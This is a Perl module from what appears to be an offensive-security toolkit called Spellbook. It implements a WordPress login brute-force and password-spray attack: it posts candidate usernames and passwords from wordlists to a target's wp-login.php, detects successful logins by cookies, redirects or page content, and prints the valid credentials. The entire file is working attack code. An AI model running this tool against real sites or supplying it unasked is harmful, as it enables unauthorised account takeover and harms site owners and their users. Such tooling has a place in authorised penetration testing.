package Spellbook::Bruteforce::Wordpress {
    use strict;
    use warnings;
    use Getopt::Long;
    use HTTP::Request::Common;
    use Spellbook::Core::UserAgent;
    use Spellbook::Helper::Read_File;

    our $VERSION = '0.0.2';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $username, $wordlist, $userlist, $password, $mode, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'       => \$help,
            't|target=s'   => \$target,
            'u|username=s' => \$username,
            'w|wordlist=s' => \$wordlist,
            'U|userlist=s' => \$userlist,
            'p|password=s' => \$password,
            'm|mode=s'     => \$mode
        );

        if ($help) {
            return "
                \rBruteforce::Wordpress
                \r=========================
                \r-h, --help         See this menu
                \r-t, --target       Define the target
                \r-u, --username     Define a single username for brute force
                \r-w, --wordlist     Define a password wordlist for brute force
                \r-U, --userlist     Define a username list for password spray
                \r-p, --password     Define a single password for password spray
                \r-m, --mode         Define bruteforce or spray\n\n";
        }

        if (!$target) {
            return @result;
        }

        if ($target !~ /^http(s)?:\/\//) {
            $target = 'https://' . $target;
        }

        if (!$mode) {
            if ($username && $wordlist) {
                $mode = 'bruteforce';
            }
        }

        if (!$mode) {
            if ($userlist && $password) {
                $mode = 'spray';
            }
        }

        if (!$mode) {
            return @result;
        }

        my $login_url = $target;

        if ($login_url !~ /wp-login\.php$/) {
            if ($login_url !~ /\/$/) {
                $login_url = $login_url . '/';
            }

            $login_url = $login_url . 'wp-login.php';
        }

        my $userAgent = Spellbook::Core::UserAgent -> new();

        if ($mode eq 'bruteforce') {
            if (!$username) {
                return @result;
            }

            if (!$wordlist) {
                return @result;
            }

            my @passwords = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);

            foreach my $candidate_password (@passwords) {
                chomp($candidate_password);

                my $response = $userAgent -> request(POST $login_url, [
                    log         => $username,
                    pwd         => $candidate_password,
                    'wp-submit' => 'Log In',
                    redirect_to => $target . '/wp-admin/',
                    testcookie  => '1',
                ]);
                my $is_success = 0;
                my $set_cookie = $response -> header('Set-Cookie');

                if ($set_cookie) {
                    if ($set_cookie =~ /wordpress_logged_in/) {
                        $is_success = 1;
                    }
                }

                my $location = $response -> header('Location');

                if ($location) {
                    if ($location =~ /wp-admin/) {
                        $is_success = 1;
                    }
                }

                my $content = $response -> decoded_content;

                if ($content) {
                    if ($content =~ /dashboard/i) {
                        $is_success = 1;
                    }
                }

                if ($is_success) {
                    push @result, $username . ':' . $candidate_password;
                    print "Valid credentials found: $username:$candidate_password\n";
                }
            }
        }

        if ($mode eq 'spray') {
            if (!$userlist) {
                return @result;
            }

            if (!$password) {
                return @result;
            }

            my @usernames = Spellbook::Helper::Read_File -> new(['--file' => $userlist]);

            foreach my $candidate_username (@usernames) {
                chomp($candidate_username);

                my $response = $userAgent -> request(POST $login_url, [
                    log         => $candidate_username,
                    pwd         => $password,
                    'wp-submit' => 'Log In',
                    redirect_to => $target . '/wp-admin/',
                    testcookie  => '1',
                ]);
                my $is_success = 0;
                my $set_cookie = $response -> header('Set-Cookie');

                if ($set_cookie) {
                    if ($set_cookie =~ /wordpress_logged_in/) {
                        $is_success = 1;
                    }
                }

                my $location = $response -> header('Location');

                if ($location) {
                    if ($location =~ /wp-admin/) {
                        $is_success = 1;
                    }
                }

                my $content = $response -> decoded_content;

                if ($content) {
                    if ($content =~ /dashboard/i) {
                        $is_success = 1;
                    }
                }

                if ($is_success) {
                    push @result, $candidate_username . ':' . $password;
                    print "Valid credentials found: $candidate_username:$password\n";
                }
            }
        }

        return @result;
    }
}

1;
